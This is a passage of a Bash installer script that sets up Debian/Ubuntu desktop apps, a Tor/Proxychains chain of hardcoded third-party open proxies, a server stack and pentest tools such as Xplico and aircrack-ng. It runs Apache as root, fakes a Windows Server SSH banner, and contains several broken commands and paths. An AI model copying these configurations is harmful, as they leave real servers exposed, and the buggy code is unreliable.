			<pref name='send_bold' type='bool' value='0'/>
			<pref name='send_italic' type='bool' value='0'/>
			<pref name='send_underline' type='bool' value='0'/>
			<pref name='spellcheck' type='bool' value='1'/>
			<pref name='show_incoming_formatting' type='bool' value='1'/>
			<pref name='resize_custom_smileys' type='bool' value='1'/>
			<pref name='custom_smileys_size' type='int' value='96'/>
			<pref name='minimum_entry_lines' type='int' value='2'/>
			<pref name='show_timestamps' type='bool' value='1'/>
			<pref name='show_formatting_toolbar' type='bool' value='1'/>
			<pref name='placement' type='string' value='last'/>
			<pref name='placement_number' type='int' value='1'/>
			<pref name='bgcolor' type='string' value=''/>
			<pref name='fgcolor' type='string' value=''/>
			<pref name='font_face' type='string' value=''/>
			<pref name='font_size' type='int' value='3'/>
			<pref name='tabs' type='bool' value='1'/>
			<pref name='tab_side' type='int' value='2'/>
			<pref name='scrollback_lines' type='int' value='4000'/>
			<pref name='chat'>
				<pref name='entry_height' type='int' value='54'/>
				<pref name='userlist_width' type='int' value='80'/>
				<pref name='x' type='int' value='0'/>
				<pref name='y' type='int' value='0'/>
				<pref name='width' type='int' value='340'/>
				<pref name='height' type='int' value='390'/>
			</pref>
			<pref name='im'>
				<pref name='x' type='int' value='649'/>
				<pref name='y' type='int' value='245'/>
				<pref name='width' type='int' value='450'/>
				<pref name='height' type='int' value='390'/>
				<pref name='animate_buddy_icons' type='bool' value='1'/>
				<pref name='entry_height' type='int' value='54'/>
				<pref name='show_buddy_icons' type='bool' value='1'/>
				<pref name='hide_new' type='string' value='never'/>
				<pref name='close_immediately' type='bool' value='1'/>
			</pref>
			<pref name='toolbar'>
				<pref name='wide' type='bool' value='0'/>
			</pref>
		</pref>
		<pref name='pounces'>
			<pref name='default_actions'>
				<pref name='open-window' type='bool' value='0'/>
				<pref name='popup-notify' type='bool' value='1'/>
				<pref name='send-message' type='bool' value='0'/>
				<pref name='execute-command' type='bool' value='0'/>
				<pref name='play-sound' type='bool' value='0'/>
			</pref>
			<pref name='dialog'>
				<pref name='width' type='int' value='520'/>
				<pref name='height' type='int' value='321'/>
			</pref>
		</pref>
		<pref name='filetransfer'>
			<pref name='clear_finished' type='bool' value='1'/>
			<pref name='keep_open' type='bool' value='0'/>
		</pref>
		<pref name='docklet'>
			<pref name='blink' type='bool' value='0'/>
			<pref name='show' type='string' value='always'/>
			<pref name='gtk'>
				<pref name='embedded' type='bool' value='1'/>
			</pref>
		</pref>
	</pref>
	<pref name='core'>
		<pref name='plugins'>
			<pref name='core-plugin_pack-google'>
				<pref name='domain' type='string' value='www.google.com'/>
			</pref>
		</pref>
	</pref>
</pref>

" >> $home/.purple/prefs.xml

}

f_writing_pidgin_prefs

rm -f status.xml
touch status.xml
echo "$home/.purple/status.xml" >> $file

f_writing_pidgin_status () {

echo "<?xml version='1.0' encoding='UTF-8' ?>

<statuses version='1.0'>
	<status name='Auto-Cached' transient='true' created='1335349856' lastused='0' usage_count='0'>
		<state>available</state>
	</status>
</statuses>

" >> $home/.purple/status.xml

}

f_writing_pidgin_status

time_stop

}

f_pidgin

# Frostwire
f_frostwire () {

echo -n "  [*] Installing frostWire ... "

timelapsed &

apt-get install -y --force-yes frostwire 1> /dev/null 2> $LOG

time_stop

}

f_frostwire

# Vinagre Gtk
f_vinagre () {

echo -n "  [*] Installing Vinagre-Gtk ... "

timelapsed &

apt-get install -y --force-yes vinagre 1> /dev/null 2> $LOG

time_stop

}

f_vinagre

# FileZilla
f_filezilla () {

echo -n "  [*] Installing Filezilla ... "

timelapsed &

apt-get install -y --force-yes filezilla 1> /dev/null 2> $LOG

time_stop

}

f_filezilla

# EtherApe
f_etherape () {

echo -n "  [*] Installing EtherApe ... "

timelapsed &

apt-get install -y --force-yes etherape 1> /dev/null 2> $LOG

time_stop

}

f_etherape

# Youtube-Dl
f_youtube_dl () {

echo -n "  [*] Installing EasyTag ... "

timelapsed &

apt-get install -y --force-yes youtube-dl 1> /dev/null 2> $LOG

time_stop

}

f_youtube_dl

}

f_lynx_buntu_debian () {

echo -n "  [*] Installing Lynx ... "

timelapsed &

apt-get install -y --force-yes lynx 1> /dev/null 2> $LOG

time_stop

}



# WebBrowser
f_midori_buntu () {

echo -n "[*] Installing Midori ... "

timelapsed &

echo "" >> /etc/apt/sources.list
echo "# Midori" >> /etc/apt/sources.list
echo "deb http://ppa.launchpad.net/midori/ppa/ubuntu natty main" >> /etc/apt/sources.list
echo "deb-src http://ppa.launchpad.net/midori/ppa/ubuntu natty main" >> /etc/apt/sources.list

echo ""
echo -n "        Key Server Downloading ... "
apt-key adv --keyserver keyserver.ubuntu.com --recv-keys A69241F1 1> /dev/null

echo ""
echo -n "        Apt-Get Update ... "
apt-get update 1> /dev/null 2> $LOG

echo ""
echo -n "        Installing ... "
apt-get install -y --force-yes midori 1> /dev/null 2> $LOG

time_stop

}

f_midori_debian () {

echo -n "[*] Installing Midori ... "

timelapsed &

apt-get install -y --force-yes midori 1> /dev/null 2> $LOG

time_stop

}

f_firefox_buntu () {

echo -n "[*] Installing Firefox ... "

timelapsed &

echo "" >> /etc/apt/sources.list
echo "# Repository Firefox" >> /etc/apt/sources.list
echo "deb http://ppa.launchpad.net/ubuntu-mozilla-daily/ppa/ubuntu natty main" >> /etc/apt/sources.list
echo "deb-src http://ppa.launchpad.net/ubuntu-mozilla-daily/ppa/ubuntu natty main" >> /etc/apt/sources.list

echo ""
echo -n "        Key Server Downloading ... "
apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 247510BE 1> /dev/null

echo ""
echo -n "        Apt-Get Update ... "
apt-get update 1> /dev/null 2> $LOG

echo ""
echo -n "        Installing ... "
apt-get install -y --force-yes firefox-trunk 1> /dev/null 2> $LOG

time_stop

}

f_iceweasel_debian () {

echo -n "[*] Installing IceWeasel ... "

timelapsed &

apt-get install -y --force-yes iceweasel 1> /dev/null 2> $LOG

time_stop

}

f_icecat_buntu_debian () {

echo -n "[*] Installing Icecat ... "

timelapsed &

echo ""
echo -n "        Repository Downloading ... "
add-apt-repository ppa:gnuzilla-team/ppa 1> /dev/null

echo ""
echo -n "        Apt-Get Update ... "
apt-get update 1> /dev/null 2> $LOG

echo ""
echo -n "        Installing ... "
apt-get install -y --force-yes icecat 1> /dev/null 2> $LOG

time_stop

}

f_chromium_buntu () {

echo -n "[*] Installing Chromium ... "

timelapsed &

echo "" >> /etc/apt/sources.list
echo "# Repository Chromium" >> /etc/apt/sources.list
echo "deb http://ppa.launchpad.net/chromium-daily/ppa/ubuntu natty main" >> /etc/apt/sources.list
echo "deb-src http://ppa.launchpad.net/chromium-daily/ppa/ubuntu natty main" >> /etc/apt/sources.list

echo ""
echo -n "        Key Server Downloading ... "
apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 4E5E17B5 1> /dev/null

echo ""
echo -n "        Apt-Get Update ... "
apt-get update 1> /dev/null 2> $LOG

echo ""
echo -n "        Installing ... "
apt-get install -y --force-yes chromium-browser 1> /dev/null 2> $LOG
apt-get install -y --force-yes chromium-browser-ffmpeg-extra 1> /dev/null 2> $LOG
apt-get install -y --force-yes chromium-browser-l10n 1> /dev/null 2> $LOG
apt-get install -y --force-yes moonlight-plugin-chromium 1> /dev/null 2> $LOG

time_stop

}

f_chromium_debian () {

echo -n "[*] Installing Chromium ... "

timelapsed &

apt-get install -y --force-yes chromium-browser 1> /dev/null 2> $LOG
apt-get install -y --force-yes chromium-browser-ffmpeg-extra 1> /dev/null 2> $LOG
apt-get install -y --force-yes chromium-browser-l10n 1> /dev/null 2> $LOG
apt-get install -y --force-yes moonlight-plugin-chromium 1> /dev/null 2> $LOG

time_stop

}

f_opera_buntu () {

echo -n "[*] Installing Opera ... "

timelapsed &

echo "" >> /etc/apt/sources.list
echo "# Repository Opera" >> /etc/apt/sources.list
echo "deb http://deb.opera.com/opera/ stable non-free" >> /etc/apt/sources.list

echo ""
echo -n "        Key Server Downloading ... "
wget http://deb.opera.com/archive.key 1> /dev/null
apt-key add archive.key 1> /dev/null
rm -f archive.key

echo ""
echo -n "        Apt-Get Update ... "
apt-get update 1> /dev/null 2> $LOG

echo ""
echo -n "        Installing ... "
apt-get install -y --force-yes opera-next 1> /dev/null 2> $LOG

time_stop

}

f_opera_debian () {

echo -n "[*] Installing Opera ... "

timelapsed &

echo "" >> /etc/apt/sources.list
echo "# Repository Opera" >> /etc/apt/sources.list
echo "deb http://deb.opera.com/opera/ sid non-free" >> /etc/apt/sources.list

echo ""
echo -n "        Key Server Downloading ... "
wget http://deb.opera.com/archive.key 1> /dev/null
apt-key add archive.key 1> /dev/null
rm -f archive.key

echo ""
echo -n "        Apt-Get Update ... "
apt-get update 1> /dev/null 2> $LOG

echo ""
echo -n "        Installing ... "
apt-get install -y --force-yes opera-next 1> /dev/null 2> $LOG

}


# Proxy (Tor + Privoxy + Proxychains)
f_proxy_buntu_debian () {

echo "[***] Proxy"

# Tor
f_tor () {

echo -n "  [*] Installing Tor ... "

timelapsed &

apt-get install -y --force-yes tor tor-geoipdb 1> /dev/null 2> $LOG

time_stop

}

f_tor

# Privoxy
f_privoxy () {

echo -n "  [*] Installing Privoxy ... "

timelapsed &

apt-get install -y --force-yes privoxy 1> /dev/null 2> $LOG

cd /etc
mkdir -p privoxy
echo "/etc/privoxy" >> $file
cd privoxy
rm -f config
touch config

f_writing_privoxy () {

echo "
# Tor listens as a SOCKS4a proxy here:
forward-socks4a / 127.0.0.1:9050 .
confdir /etc/privoxy
logdir /var/log/privoxy
actionsfile standard  Internal purpose, recommended
actionsfile default.action   Main actions file
actionsfile user.action      User customizations
filterfile default.filter
#Don''t log interesting things, only startup messages, warnings and errors
logfile logfile
#jarfile jarfile
#debug   0    show each GET/POST/CONNECT request
#debug   4096 Startup banner and warnings
#debug   8192 Errors - *we highly recommended enabling this*
#user-manual /usr/share/doc/privoxy/user-manual
#listen-address  127.0.0.1:8118
#toggle  1
#enable-remote-toggle 0
#enable-edit-actions 0
#enable-remote-http-toggle 0
#buffer-limit 4096

forward-socks4a .onion localhost:9050 .
forward / localhost:4444

" >> config

}

f_writing_privoxy
echo "/etc/privoxy/config" >> $file


cd $home

time_stop

}

f_privoxy

# Proxychains
f_proxychains () {

echo -n "  [*] Installing Proxychains ... "

timelapsed &

apt-get install -y --force-yes proxychains 1> /dev/null 2> $LOG

rm -f /etc/proxychains.conf
touch /etc/proxychains.conf

f_writing_proxychains () {

echo "
# proxychains.conf  VER 3.1
#
#        HTTP, SOCKS4, SOCKS5 tunneling proxifier with DNS.
#

# The option below identifies how the ProxyList is treated.
# only one option should be uncommented at time,
# otherwise the last appearing option will be accepted


dynamic_chain
#
# Dynamic - Each connection will be done via chained proxies
# all proxies chained in the order as they appear in the list
# at least one proxy must be online to play in chain
# (dead proxies are skipped)
# otherwise EINTR is returned to the app
#

#strict_chain
#
# Strict - Each connection will be done via chained proxies
# all proxies chained in the order as they appear in the list
# all proxies must be online to play in chain
# otherwise EINTR is returned to the app
#

#random_chain
#
# Random - Each connection will be done via random proxy
# (or proxy chain, see  chain_len) from the list.
# this option is good to test your IDS :)

# Make sense only if random_chain
#chain_len = 2

# Quiet mode (no output from library)
#quiet_mode

# Proxy DNS requests - no leak for DNS data
proxy_dns

# Some timeouts in milliseconds
tcp_read_time_out 15000
tcp_connect_time_out 8000

# ProxyList format
#
#       http/socks5/socks4      IP/Url      Ports       (Usr)     (Psswd)
#

[ProxyList]
# India Madras HighAnonimity
http 117.239.105.164 1080

# France
socks4 178.33.204.42  1080

# Provoxy Tor
socks5 127.0.0.1 9050

# USA Los Angeles HighAnonimity
http 65.255.47.12 8080

# Japan Osaka HighAnonimity
http 59.106.177.23 8080

# Privoxy Tor
socks5 127.0.0.1 9050

# USA Bel Air HighAnonimity
socks5 98.204.197.51 1611

# Russia
http 78.139.77.41 8080

# Albany
socks4 109.69.0.14  8741

# Ukraine iig.217.terabit.net.ua HighAnonimity
socks5 94.45.138.217 1080

# VietNam HighAnonimity
socks5 http 118.69.198.215 108

# Privoxy, used with Tor to surf the Deep Web
socks5 127.0.0.1 9050

" >> /etc/proxychains.conf

}

f_writing_proxychains
echo "/etc/proxychains.conf" >> $file

cd $home

/etc/init.d/tor restart 1> /dev/null
/etc/init.d/privoxy restart 1> /dev/null

time_stop

}

f_proxychains

}



# Avant Window Navigator
f_awn_buntu_debian () {

echo -n "[*] Installing Avant-Window-Navigator ... "

timelapsed &

apt-get install -y --force-yes avant-window-navigator 1> /dev/null 2> $LOG

time_stop

}



# Server (Apache-Xplico-Mysql-PHP-ftp(ssl)-ssh-telnet(ssl)-cups-Samba-VNC)
f_apache_buntu_debian () {

echo " [*] Installing Apache Web Server ... "

timelapsed &

apt-get install -y --force-yes apache2 apache2-doc apache2-bin apache2-utils libexpat1 ssl-cert 1> /dev/null 2> $LOG

rm -f /etc/apache2/httpd.conf
touch /etc/apache2/httpd.conf

f_writing_apache2_httpd_conf () {

echo "
####################################################################

ServerName Babuin
ServerRoot /etc/apache2
DocumentRoot /var/www
User root
Group root
ServerAdmin gofuck@your.self

####################################################################

KeepAlive On
MaxKeepAliveRequests 100
KeepAliveTimeout 15
MinSpareServers 16
MaxSpareServers 64
StartServers 16
MaxClients 256
MaxRequestsPerChild 100000
DefaultType text/plain

HostnameLookups On
ErrorLog /var/log/apache2/error.log


####################################################################

Include /etc/apache2/httpd.conf
Include /etc/apache2/ports.conf
Include /etc/apache2/conf.d/
Include /etc/apache2/sites-enabled/
Include /etc/apache2/mods-enabled/*.load
Include /etc/apache2/mods-enabled/*.conf

####################################################################

 Alias /error/ £+/usr/share/apache2/error/£+

    <Directory £+/usr/share/apache2/error£+>
        AllowOverride None
        Options IncludesNoExec
        AddOutputFilter Includes html
        AddHandler type-map var
        Order allow,deny
        Allow from all
        LanguagePriority en cs de es fr it nl sv pt-br ro
        ForceLanguagePriority Prefer Fallback
    </Directory>

    ErrorDocument 400 /error/HTTP_BAD_REQUEST.html.var
    ErrorDocument 401 /error/HTTP_UNAUTHORIZED.html.var
    ErrorDocument 403 /error/HTTP_FORBIDDEN.html.var
    ErrorDocument 404 /error/HTTP_NOT_FOUND.html.var
    ErrorDocument 405 /error/HTTP_METHOD_NOT_ALLOWED.html.var
    ErrorDocument 408 /error/HTTP_REQUEST_TIME_OUT.html.var
    ErrorDocument 410 /error/HTTP_GONE.html.var
    ErrorDocument 411 /error/HTTP_LENGTH_REQUIRED.html.var
    ErrorDocument 412 /error/HTTP_PRECONDITION_FAILED.html.var
    ErrorDocument 413 /error/HTTP_REQUEST_ENTITY_TOO_LARGE.html.var
    ErrorDocument 414 /error/HTTP_REQUEST_URI_TOO_LARGE.html.var
    ErrorDocument 415 /error/HTTP_UNSUPPORTED_MEDIA_TYPE.html.var
    ErrorDocument 500 /error/HTTP_INTERNAL_SERVER_ERROR.html.var
    ErrorDocument 501 /error/HTTP_NOT_IMPLEMENTED.html.var
    ErrorDocument 502 /error/HTTP_BAD_GATEWAY.html.var
    ErrorDocument 503 /error/HTTP_SERVICE_UNAVAILABLE.html.var
    ErrorDocument 506 /error/HTTP_VARIANT_ALSO_VARIES.html.var

####################################################################
" | sed -e 's/£+/g' >> /etc/apache2/httpd.conf

}

f_writing_apache2_httpd_conf
echo "/etc/apache2/httpd.conf" >> $file

rm -f /etc/apache2/ports.conf
touch /etc/apache2/ports.conf

f_writing_apache2_ports () {

echo "
# Http
NameVirtualHost *:80
Listen 80

# Https
<IfModule mod_ssl.c>
    Listen 443
</IfModule>
" >> /etc/apache2/ports.conf

}

f_writing_apache2_ports
echo "/etc/apache2/ports.conf" >> $file

apt-get install -y --force-yes openssl 1> /dev/null 2> $LOG

apt-get install -y --force-yes libapache-mod-security 1> /dev/null 2> $LOG
a2enmod mod-security 1> /dev/null

apt-get install -y --force-yes libapache-mod-ssl 1> /dev/null 2> $LOG
a2enmod ssl 1> /dev/null

/etc/init.d/apache2 restart 1> /dev/null

time_stop

}

f_xplico_buntu_debian () { # richiede apache

echo -n "[*] Installing Xplico ... "

timelapsed &

cd /opt
mkdir Xplico
cd Xplico

echo ""
echo -n "      Installing Dependencies ... "
apt-get install -y --force-yes tcpdump tshark apache2 php5 php5-sqlite build-essential perl zlib1g-dev libpcap-dev libsqlite3-dev php5-cli libapache2-mod-php5  libx11-dev  libxt-dev libxaw7-dev python-all sqlite3 recode sox lame libnet1 libnet1-dev 1> /dev/null 2> $LOG
#    apt-get install -y --force-yes libmysqlclient16-dev 1> /dev/null 2> $LOG

axel http://downloads.sourceforge.net/project/xplico/Xplico%20versions/version%200.6.1/xplico-0.6.1.tgz 1> /dev/null
tar xvfz xplico-0.6.1.tgz 1> /dev/null
echo ""
echo -n "      Downloading GeoIP ... "
axel http://geolite.maxmind.com/download/geoip/api/c/GeoIP-1.4.6.tar.gz 1> /dev/null
tar xvfz GeoIP-1.4.6.tar.gz 1> /dev/null
cd GeoIP-1.4.6
./configure 1> /dev/null
make 1> /dev/null
make install 1> /dev/null
cd /pentest/Xplico
cd xplico-0.6.1
echo ""
echo -n "      Downloading GeoLiteCity ... "
axel http://geolite.maxmind.com/download/geoip/database/GeoLiteCity.dat.gz 1> /dev/null
gzip -d GeoLiteCity.dat.gz 1> /dev/null
cd /pentest/Xplico
echo ""
echo -n "      Downloading GhostPdl ... "
axel http://mirror.cs.wisc.edu/pub/mirrors/ghost/GPL/ghostpdl/ghostpdl-8.70.tar.bz2 1> /dev/null
tar xvfj ghostpdl-8.70.tar.bz2 1> /dev/null
cd ghostpdl-8.70
make 1> /dev/null
make install 1> /dev/null
cd /pentest/Xplico/ghostpdl-8.70/main/obj
cp pcl6 /pentest/Xplico/xplico-0.6.1
cd /pentest/Xplico
echo ""
echo -n "      Downloading VideoSnarf ... "
axel http://downloads.sourceforge.net/project/ucsniff/videosnarf/videosnarf-0.63.tar.gz 1> /dev/null
tar xvzf videosnarf-0.63.tar.gz 1> /dev/null
cd videosnarf-0.63
./configure 1> /dev/null
make 1> /dev/null
make install 1> /dev/null
echo ""
echo -n "      Compiling And Installing Xplico ... "
cd /pentest/Xplico/videosnarf-0.63/src/
cp videosnarf /pentest/Xplico/xplico-0.6.1
cd /pentest/Xplico
cd xplico-0.6.1
make 1> /dev/null
make install 1> /dev/null
cd $home
cp /pentest/xplico/cfg/apache_xi /etc/apache2/sites-enabled/xplico
echo "

# Xplico Host port
NameVirtualHost *:9876
Listen 9876
" >> /etc/apache2/ports.conf
a2enmod rewrite 1> /dev/null
/etc/init.d/apache2 restart 1> /dev/null
cd /pentest
rm -fr Xplico
cd $home

time_stop

}

f_php5_buntu_debian () { # richiede apache

echo -n "[*] Installing PHP ... "

timelapsed &

apt-get install -y --force-yes libapache2-mod-php5 php5 php5-common php5-curl php5-dev php5-idn php-pear php5-recode php5-snmp php5-sqlite php5-xmlrpc php5-mcrypt php5-memcache php5-mhash php5-ming php5-mysql php5-ps php5-pspell libssl-dev 1> /dev/null 2> $LOG

echo "

LoadModule php5_module modules/libphp5.so
<FilesMatch \.php$>
       SetHandler application/x-httpd-php
</FilesMatch>
<FilesMatch \.phps$>
        SetHandler application/x-httpd-php-source
</FilesMatch>

####################################################################
" >> /etc/apache2/httpd.conf

cd /etc/php5/apache2
echo "/etc/php5/apache2" >> $file

rm -f php.ini
touch php.ini

f_writing_php_ini () {

echo "
[PHP]

engine = On
short_open_tag = On
asp_tags = Off
precision = 14
y2k_compliance = On
output_buffering = 4096
zlib.output_compression = Off
implicit_flush = Off
unserialize_callback_func =
serialize_precision = 100
allow_call_time_pass_reference = Off
safe_mode = Off
safe_mode_gid = Off
safe_mode_include_dir =
safe_mode_exec_dir =
safe_mode_allowed_env_vars = PHP_
safe_mode_protected_env_vars = LD_LIBRARY_PATH
disable_functions =
disable_classes =
max_execution_time = 500
max_input_time = 60
memory_limit = 256M
error_reporting = E_ALL & ~E_DEPRECATED
display_errors = Off
display_startup_errors = Off
log_errors = On
log_errors_max_len = 1024
ignore_repeated_errors = Off
ignore_repeated_source = Off
eport_memleaks = On
track_errors = Off
html_errors = Off
variables_order = £+GPCS£+
request_order = £+GP£+
register_globals = Off
register_long_arrays = Off
register_argc_argv = Off
auto_globals_jit = On
post_max_size = 10000M
magic_quotes_gpc = Off
magic_quotes_runtime = Off
magic_quotes_sybase = Off
auto_prepend_file =
auto_append_file =
default_mimetype = £+text/html£+
doc_root =
user_dir =
enable_dl = Off
file_uploads = On
upload_max_filesize = 10000M
max_file_uploads = 200
allow_url_fopen = On
allow_url_include = Off
default_socket_timeout = 60

[Date]

[iconv]

[intl]

[sqlite]

[sqlite3]

[Pcre]

[Pdo]

[Pdo_mysql]
pdo_mysql.cache_size = 2000
pdo_mysql.default_socket=

[Phar]

[Syslog]
define_syslog_variables  = Off

[mail function]
SMTP = localhost
smtp_port = 25
mail.add_x_header = On

[SQL]
sql.safe_mode = Off

[ODBC]
odbc.allow_persistent = On
odbc.check_persistent = On
odbc.max_persistent = -1
odbc.max_links = -1
odbc.defaultlrl = 4096
odbc.defaultbinmode = 1
[Interbase]
ibase.allow_persistent = 1
ibase.max_persistent = -1
ibase.max_links = -1
ibase.timestampformat = £+%Y-%m-%d %H:%M:%S£+
ibase.dateformat = £+%Y-%m-%d£+
ibase.timeformat = £+%H:%M:%S£+

[MySQL]
mysql.allow_local_infile = On
mysql.allow_persistent = On
mysql.cache_size = 2000
mysql.max_persistent = -1
mysql.max_links = -1
mysql.default_port =
mysql.default_socket =
mysql.default_host =
mysql.default_user =
mysql.default_password =
mysql.connect_timeout = 60
mysql.trace_mode = Off

[MySQLi]
mysqli.max_persistent = -1
mysqli.allow_persistent = On
mysqli.max_links = -1
mysqli.cache_size = 2000
mysqli.default_port = 3306
mysqli.default_socket =
mysqli.default_host =
mysqli.default_user =
mysqli.default_pw =
mysqli.reconnect = Off

[mysqlnd]
mysqlnd.collect_statistics = On
mysqlnd.collect_memory_statistics = Off
;mysqlnd.net_cmd_buffer_size = 2048

[OCI8]

[PostgresSQL]
pgsql.allow_persistent = On
pgsql.auto_reset_persistent = Off
pgsql.max_persistent = -1
pgsql.max_links = -1
pgsql.ignore_notice = 0
pgsql.log_notice = 0

[Sybase-CT]

[bcmath]
bcmath.scale = 0

[browscap]

[Session]
session.save_handler = files
session.use_only_cookies = 1
session.name = PHPSESSID
session.auto_start = 0
session.cookie_lifetime = 0
session.cookie_path = /
session.cookie_domain =
session.cookie_httponly =
session.serialize_handler = php
session.gc_probability = 1
session.gc_divisor = 1000
session.gc_maxlifetime = 1440
session.bug_compat_42 = Off
session.bug_compat_warn = Off
session.referer_check =
session.entropy_length = 0
session.cache_limiter = nocache
session.cache_expire = 180
session.use_trans_sid = 0
session.hash_function = 0
session.hash_bits_per_character = 5
url_rewriter.tags = £+a=href,area=href,frame=src,input=src,form=fakeentry£+

[MSSQL]
mssql.allow_persistent = On
mssql.max_persistent = -1
mssql.max_links = -1
mssql.min_error_severity = 10
mssql.min_message_severity = 10
mssql.compatability_mode = Off
mssql.secure_connection = Off

[Assertion]

[COM]

[mbstring]

[gd]

[exif]

[Tidy]
tidy.clean_output = Off

[soap]
soap.wsdl_cache_enabled=1
soap.wsdl_cache_dir=£+/tmp£+
soap.wsdl_cache_ttl=86400
soap.wsdl_cache_limit = 5

[sysvshm]

[ldap]
ldap.max_links = -1

[mcrypt]

[dba]

" | sed -e 's/£+/"/g' >> php.ini

}

f_writing_php_ini
echo "/etc/php5/apache2/php.ini" >> $file


cd $home

/etc/init.d/apache2 restart 1> /dev/null

time_stop

}

f_sqlite3_buntu_debian () {

echo -n "[*] Installing Sqlite ... "

timelapsed &

apt-get install -y --force -yes sqlite3 1> /dev/null 2> $LOG

time_stop

}

f_mysql_buntu_debian () {

echo " [*] Installing MySql ... "

timelapsed &

apt-get install -y --force-yes mysql-server mysql-client 1> /dev/null 2> $LOG

apt-get install -y --force-yes python-pymssql python-mysqldb 1> /dev/null 2> $LOG

apt-get install -y --force-yes mysql-utilities 1> /dev/null 2> $LOG

apt-get install -y --force-yes mysql-workbench 1> /dev/null 2> $LOG

service mysql stop 1> /dev/null

cd /etc/mysql
echo "/etc/mysql" >> $file

rm -f my.cfn
touch my.cfn

f_writing_mysql_cfn () {

echo "
[client]
port		= 3306
socket		= /var/run/mysqld/mysqld.sock

[mysqld_safe]
socket		= /var/run/mysqld/mysqld.sock
nice		= 0

[mysqld]
user		= mysql
socket		= /var/run/mysqld/mysqld.sock
port		= 3306
basedir		= /usr
datadir		= /var/lib/mysql
tmpdir		= /tmp
skip-external-locking

bind-address		= 127.0.0.1

key_buffer		= 16M
max_allowed_packet	= 128M
thread_stack		= 192K
thread_cache_size       = 8

myisam-recover         = BACKUP
#max_connections        = 100
#table_cache            = 64
#thread_concurrency     = 10

query_cache_limit	= 1M
query_cache_size        = 16M

#general_log_file        = /var/log/mysql/mysql.log
#general_log             = 1

log_error                = /var/log/mysql/error.log

#log_slow_queries	= /var/log/mysql/mysql-slow.log
#long_query_time = 2
#log-queries-not-using-indexes

#server-id		= 1
#log_bin			= /var/log/mysql/mysql-bin.log
expire_logs_days	= 10
max_binlog_size         = 100M
#binlog_do_db		= include_database_name
#binlog_ignore_db	= include_database_name

# chroot = /var/lib/mysql/

# For generating SSL certificates I recommend the OpenSSL GUI: tinyca
# ssl-ca=/etc/mysql/cacert.pem
# ssl-cert=/etc/mysql/server-cert.pem
# ssl-key=/etc/mysql/server-key.pem

[mysqldump]
quick
quote-names
max_allowed_packet	= 64M

[mysql]
#no-auto-rehash	# faster start of mysql but no tab completition

[isamchk]
key_buffer		= 16M

!includedir /etc/mysql/conf.d/

" >> my.cfn

}

f_writing_mysql_cfn
echo "/etc/mysql/my.cfn" >> $file

cd $home

sleep 3
service mysql start 1> /dev/null

time_stop

}

f_samba_buntu_debian () {

echo -n "[*] Installing Samba ... "

timelapsed &

apt-get install -y --force-yes samba smbfs swat 1> /dev/null 2> $LOG

cd /media
mkdir -p share

cd $home

mv /etc/samba/smb.conf /etc/samba/smb.conf.original

cd /etc/samba
echo "/etc/samba" >> $file

touch smb.conf

f_writing_samba_conf () {

echo "#======================= Global Settings =======================#

[global]

   workgroup = WORKGROUP
   server string = %h server (Samba, Ubuntu)
   wins support = yes
   dns proxy = no

#### Debugging/Accounting ####

   log file = /var/log/samba/log.%m
   max log size = 1000000
   syslog = 0
   panic action = /usr/share/samba/panic-action %d

####### Authentication #######

   security = user
   encrypt passwords = true
   passdb backend = tdbsam
   obey pam restrictions = yes
   unix password sync = yes
   passwd program = /usr/bin/passwd %u
   passwd chat = *Enter\snew\s*\spassword:* %n\n *Retype\snew\s*\spassword:* %n\n *password\supdated\ssuccessfully* .
   pam password change = yes
   map to guest = bad user

########## Printing ##########

   load printers = yes

####### Misc ############

   include = /home/samba/etc/smb.conf.%m

         SO_RCVBUF=8192 SO_SNDBUF=8192
   socket options = TCP_NODELAY
   usershare max shares = 10000
   usershare allow guests = yes

#======================= Share Definitions =======================

[homes]
   comment = Home Directories
   browseable = yes
   read only = yes
   directory mask = 0700
   valid users = %S

[profiles]
   comment = Users profiles
   path = $home/samba/profiles
   guest ok = no
   browseable = no
   create mask = 0600
   directory mask = 0700

[printers]
   comment = All Printers
   browseable = no
   path = /var/spool/samba
   printable = yes
   guest ok = no
   read only = yes
   create mask = 0700

[print$]
   comment = Printer Drivers
   path = /var/lib/samba/printers
   browseable = yes
   read only = yes
   guest ok = yes

[cdrom]
   comment = Samba server's CD-ROM
   read only = yes
   locking = no
   path = /cdrom
   guest ok = yes

" >> smb.conf

}

f_writing_samba_conf
echo "/etc/samba/smb.conf" >> $file

cd $home

time_stop

}

f_ssh_client_buntu_debian () {

echo -n "[*] Installing Ssh ... "

timelapsed &

apt-get install -y --force-yes ssh 1> /dev/null 2> $LOG

time_stop

}

f_ssh_server_buntu_debian () {

echo -n "[*] Installing Ssh Server ... "

timelapsed &

apt-get install -y --force-yes ssh openssh-server sshguard 1> /dev/null 2> $LOG

cd /etc/ssh
cp /etc/ssh/ssh_config /etc/ssh/ssh_config.back
echo "Banner /etc/issue.net" >> /etc/ssh/ssh_config
echo "/etc/ssh/ssh_config" >> $file

cd /etc
rm issue.net
touch issue.net

f_writing_issue_net () {

echo "# ====================== Window Server 2008 ====================== #

################################

# Services

Http    -----> 80
Https   -----> 443
Ftp     -----> 25
Ssh     -----> 20
Pop     -----> 110

##################################

" >> issue.net

}

f_writing_issue_net
echo "/etc/issue.net" >> $file


cd $home

time_stop

}

f_telnet_client_buntu_debian () {

echo -n "[*] Installing Telnet Ssl ... "

timelapsed &

apt-get install -y --force-yes telnet-ssl 1> /dev/null 2> $LOG

time_stop

}

f_telnet_server_buntu_debian () {

echo -n "[*] Installing Telnet (Ssl) ... "

timelapsed &

apt-get install -y --force-yes telnet-ssl telnetd-ssl 1> /dev/null 2> $LOG

time_stop

}

f_ftp_client_buntu_debian () {

echo -n "[*] Installing Ftp Ssl ... "

timelapsed &

apt-get install -y --force-yes ftp-ssl 1> /dev/null 2> $LOG

time_stop

}

f_ftp_server_buntu_debian () {

echo -n "[*] Installing Ftp Server (Ssl) ... "

timelapsed &

apt-get install -y --force-yes ftp-ssl vsftpd 1> /dev/null 2> $LOG

time_stop

}

f_cups_buntu_debian () {

echo -n "[*] Installing Cups ... "

timelapsed &

apt-get install -y --force-yes cups 1> /dev/null 2> $LOG

time_stop

}

f_vnc_buntu_debian () {

echo -n "[*] Installing VNC Server ... "

timelapsed &

apt-get install -y --force-yes vnc4server 1> /dev/null 2> $LOG

time_stop

}



# Pentest
f_aircrack_ng () { # libssl-dev libpcap-dev sqlite3

echo -n "[*] Installing Aircrack-ng ... "

timelapsed &

cd /pentest

echo "    Downloading SubVersion Source Code ... "
svn co http://trac.aircrack-ng.org/svn/trunk aircrack-ng 1> /dev/null

